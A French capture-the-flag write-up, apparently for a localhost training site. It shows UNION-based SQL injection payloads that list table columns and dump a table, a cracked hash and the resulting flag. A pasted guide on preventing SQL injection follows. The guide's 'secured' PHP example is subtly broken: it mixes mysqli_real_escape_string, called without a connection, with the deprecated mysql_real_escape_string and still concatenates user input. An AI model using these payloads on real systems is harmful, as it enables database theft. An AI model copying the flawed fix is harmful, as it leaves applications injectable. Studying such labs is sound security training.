page : http://localhost:8080/index.php?page=searchimg

input TRUE nous montre que les injections SQL sont ici aussi possible.

on test directement la commande trouvee via lautre injection, pour recuperer le nom de la table et de ses colonnes
TRUE UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()

on obtient
Nsa, id, url, title, comment

en affichant les differentes colonnes on obtientun resultat concluant avec cette commande :
TRUE UNION SELECT url, comment FROM list_images

ID: TRUE UNION SELECT url, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png

via le meme site que lautre injection :
1928e8083cf461a51303633093573c46 : albatroz

echo -n albatroz | shasum -a 256
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -

le flag est donc f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


DANGER :
dump les infos de l'integralite dune base, dans le pire des cas possibilites de modifier integralement les champs de la base (pop push column)


PROTECTION :
parser les inputs avec des regex ou des fonctions comme mysql_real_escape_string() qui retire les chars speciaux de l'input

Comment protéger vos bases de données d’une injection SQL ?
Vous pouvez mettre en place différentes mesures pour empêcher une attaque par injection SQL de votre système de base de données. Par conséquent, il est nécessaire de s’attarder sur l’ensemble des composants impliqués, tels que le serveur, sur chacune des applications mais aussi sur les systèmes de management de base de données.

Etape 1 : superviser la saisie automatique des applications

Testez et filtrez les méthodes et paramètres utilisés par les applications connectées lors de vos saisies dans la base de données. Les données remises devraient toujours être en accord avec le type de données attendu. Si un paramètre numérique est requis, vous pouvez le vérifier avec un script PHP à l’aide de la fonction is_numeric(). En ce qui concerne les filtres, les caractères spéciaux correspondants sont ignorés. Un autre point important est de s’assurer que les applications n’émettent pas de messages d’erreurs externes qui indiquent des informations sur le système utilisé ou les structures de la base de données.

Entre-temps, d’autres pratiques se sont largement répandues, comme ce que l’on nomme les Prepared Statements qui peuvent être utilisées avec de nombreux systèmes de management de banques de données. Ces déclarations prédéfinies étaient à l’origine utilisées pour exécuter des requêtes fréquentes, mais du fait de leur structure, elles permettent également de réduire les risques d’injection SQL. En effet, les instructions paramétrées transfèrent la commande SQL réelle des paramètres séparément de la base de données. Seul le système de management de la base de données lui-même relie les deux et masque ainsi automatiquement les caractères spéciaux importants.

Etape 2 : s’assurer de la protection complète du serveur

La sécurité du serveur sur lequel a cours votre système de gestion de base de données joue naturellement un rôle primordial dans la prévention contre les injections SQL. La première étape est donc de renforcer votre système d’exploitation selon le schéma établi :

Installer ou activer seulement les applications et services qui sont pertinents pour faire fonctionner la base de données.
Supprimer tous les comptes utilisateurs qui ne sont pas nécessaires.
S’assurer que toutes les mises à jour des systèmes et programmes pertinents sont installés.
Plus votre projet Web exige des mesures de sécurité importantes, et plus vous devrez envisager l’utilisation en amont de systèmes de détections d’intrusion (IDS) ou de systèmes de prévention d’intrusions (IPS). Cela fonctionne avec différents systèmes de reconnaissance pour identifier en amont les attaques sur le serveur, émettre des avertissements et dans le cas d’IPS de faire déclencher automatiquement les contre-mesures correspondantes. Un processus ALG (Application Layer Gateway) peut également être une mesure de protection judicieuse, en surveillant le trafic de données entre les applications et le navigateur Web directement au niveau de l’application.

Etape 3 : renforcer les bases de données et utiliser des codes sûrs

Tout comme votre système d’exploitation, les bases de données doivent être débarrassées de tout élément inutile et être mises à jour régulièrement. A cette fin, éliminez toutes les procédures enregistrées dont vous n’avez pas besoin et désactivez tous les services et comptes utilisateurs inutiles. Installez un compte spécifique pour votre base de données, qui sera prévu simplement pour y accéder depuis le Web, et qui sera pourvu de droits d’accès très restreints. Enregistrez par ailleurs dans votre base de données toutes les données sensibles de manière chiffrée, comme par exemple vos mots de passe.

Pour les Prepared Statements, il est urgemment recommandé de ne pas utiliser le module PHP mysql mais de choisir à la place mysqli ou PDO. De cette manière, vous pourrez par la même occasion vous protéger avec des codes sûrs. La fonction mysqli_real_escape_string() du script PHP permet par exemple d’éviter d’émettre des caractères spéciaux aux bases de données SQL sous leur forme originale. Si vous prenez par exemple les lignes de code ci-dessous :

$query = "SELECT * FROM users 
WHERE username= '" . $_POST['username'] . "' 
AND password= '" . $_POST['password'] . "'";
Pour les rallonger avec la fonction mentionnée :

$query = "SELECT * FROM users 
WHERE username= '" . mysqli_real_escape_string($_POST['username']) . "' 
AND password= '" . mysql_real_escape_string($_POST['password']) . "'";
